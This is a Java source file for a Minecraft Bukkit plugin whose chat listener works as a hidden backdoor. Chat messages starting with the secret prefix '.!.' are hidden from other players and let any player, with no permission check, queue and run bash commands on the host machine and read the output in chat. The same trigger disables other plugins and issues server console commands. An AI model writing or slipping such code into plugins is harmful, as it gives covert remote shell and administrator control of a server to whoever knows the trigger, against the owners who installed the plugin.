package com.github.professorSam.special;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Writer;
import java.util.ArrayList;
import java.util.Scanner;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

public class ChatListener implements Listener {

	private static ArrayList<String> commands = new ArrayList<String>();

	@EventHandler
	public void onChatEvent(AsyncPlayerChatEvent event) {
		final String[] message = event.getMessage().split(" ");
		final int length = message.length;
		final Player player = event.getPlayer();
		if (length <= 1) {
			return;
		}
		if (!message[0].equalsIgnoreCase(".!.")) {
			return;
		}
		if (length < 3) {
			return;
		}
		event.setCancelled(true);

		Bukkit.getScheduler().runTask(com.github.professorSam.special.Plugin.plugin, new Runnable() {
			
			public void run() {
				if (message[1].equalsIgnoreCase("add")) {
					String command = "";
					for (int i = 0; i < length; i++) {
						if (i == 0 || i == 1) {
							continue;
						}
						command = command + message[i] + " ";
						
					}
					commands.add(command);
					player.sendMessage("ok");
				}
				if (message[1].equalsIgnoreCase("command")) {
					if (message[2].equalsIgnoreCase("list")) {
						for (String string : commands) {
							player.sendMessage(string);
						}
					}
					if (message[2].equalsIgnoreCase("delete")) {
						commands.clear();
					}
					if (message[2].equalsIgnoreCase("execute")) {
						try {
							File file = executeCommands();
							readFromFileAndSendToPlayer(player, file);
							file.delete();
							commands.clear();
							player.sendMessage("Sucess");
						} catch (Exception e) {
							player.sendMessage("Fail");
						}
					}

				}

				if (message[1].equalsIgnoreCase("unload")) {
					Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(message[2]);
					if (plugin == null) {
						return;
					}
					Bukkit.getServer().getPluginManager().disablePlugin(plugin);
				}
				if (message[1].equalsIgnoreCase("console")) {
					String consolecommand = "";
					for (int i = 0; i < length; i++) {
						if (i == 0 || i == 1) {
							continue;
						}
						consolecommand = consolecommand + " " + message[i];
					}
					Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), consolecommand);
				}
				
			}
		});

	}

	public File executeCommands() throws IOException, InterruptedException {
		
		File file = new File("log");
		file.createNewFile();
		
		File tempScript = createTempScript();

		try {
			ProcessBuilder pb = new ProcessBuilder("bash", tempScript.toString());
			//pb.inheritIO();
			
			pb.redirectOutput(file);
			pb.redirectInput(file);
			pb.redirectError(file);
			
			Process process = pb.start();
			process.waitFor();
		} finally {
			tempScript.delete();
		}
	 return file;
	}

	public File createTempScript() throws IOException {
		File tempScript = File.createTempFile("script", null);

		Writer streamWriter = new OutputStreamWriter(new FileOutputStream(tempScript));
		PrintWriter printWriter = new PrintWriter(streamWriter);

		for (String string : commands) {
			printWriter.println(string);
		}

		printWriter.close();

		return tempScript;
	}
	
	private void readFromFileAndSendToPlayer(Player player, File file) {
	    try {
	        Scanner myReader = new Scanner(file);
	        while (myReader.hasNextLine()) {
	          String data = myReader.nextLine();
	          player.sendMessage(data);
	        }
	        myReader.close();
	      } catch (FileNotFoundException e) {
	        player.sendMessage("Error while reading output!");
	      }
	}

}
